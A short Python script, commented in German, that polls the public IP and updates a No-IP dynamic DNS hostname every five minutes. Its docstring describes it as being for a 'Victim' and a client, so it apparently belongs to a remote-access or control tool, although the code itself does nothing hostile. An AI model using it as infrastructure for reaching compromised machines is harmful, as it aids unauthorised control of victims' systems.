#!/usr/bin/env python3
"""
DDNS Updater für Victim und Client
Aktualisiert automatisch die IP bei No-IP
"""
import requests
import time
import os
import config


def get_public_ip():
    """Hole die aktuelle öffentliche IP"""
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=10)
        return response.json()['ip']
    except Exception:
        return None

def update_noip_ip(new_ip):
    """Aktualisiere IP bei No-IP"""
    try:
        username = os.environ.get("NOIP_USERNAME", "")
        password = os.environ.get("NOIP_PASSWORD", "")
        hostname = config.DDNS_HOSTNAME

        if not username or not password:
            print("[!] Kein DDNS-Benutzername oder Passwort gesetzt. Setze NOIP_USERNAME und NOIP_PASSWORD als Umgebungsvariablen.")
            return False

        url = f"https://{username}:{password}@dynupdate.no-ip.com/nic/update"
        params = {
            'hostname': hostname,
            'myip': new_ip
        }
        response = requests.get(url, params=params, timeout=10)
        if response.status_code == 200:
            print(f"[+] DDNS aktualisiert: {new_ip}")
            return True
        else:
            print(f"[-] DDNS Update fehlgeschlagen: {response.text}")
            return False
    except Exception as e:
        print(f"[-] DDNS Fehler: {e}")
        return False

def ddns_worker():
    """Worker der regelmäßig die IP prüft und aktualisiert"""
    print("[*] DDNS Worker gestartet")
    last_ip = None

    while True:
        try:
            current_ip = get_public_ip()
            if current_ip and current_ip != last_ip:
                print(f"[*] Neue IP erkannt: {current_ip}")
                if update_noip_ip(current_ip):
                    last_ip = current_ip
                    # Speichere IP lokal für Backup
                    with open('current_ip.txt', 'w') as f:
                        f.write(current_ip)
            time.sleep(300)  # alle 5 Minuten prüfen
        except Exception as e:
            print(f"[-] DDNS Worker Fehler: {e}")
            time.sleep(60)

if __name__ == "__main__":
    ddns_worker()